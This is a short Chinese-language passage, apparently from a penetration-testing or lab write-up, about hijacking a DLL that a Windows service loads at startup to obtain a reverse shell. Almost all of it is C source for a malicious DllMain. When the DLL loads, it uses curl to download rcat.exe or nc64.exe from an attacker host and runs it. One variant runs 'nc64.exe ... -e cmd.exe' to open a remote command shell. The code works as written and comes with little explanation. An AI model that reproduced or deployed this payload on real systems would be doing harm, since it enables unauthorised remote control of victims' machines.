我们需要更换启动需要的dll文件，从而来获取反弹shell

```
#编辑文件
vi Selfservice.c

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
 			
            system("cmd.exe /c mkdir C:\\Temp");
            system("cmd.exe /c curl http://10.8.4.161/rcat.exe -o C:\\Temp\\rcat_10.8.4.161_443.exe");
            system("C:\\Temp\\rcat_10.8.4.161_443.exe");
 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
 
            system("curl 10.8.4.161/nc64.exe -o C:\\Windows\\Temp\\nc64.exe");
            system("C:\\Windows\\Temp\\nc64.exe 10.8.4.161 443 -e cmd.exe");
 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

```
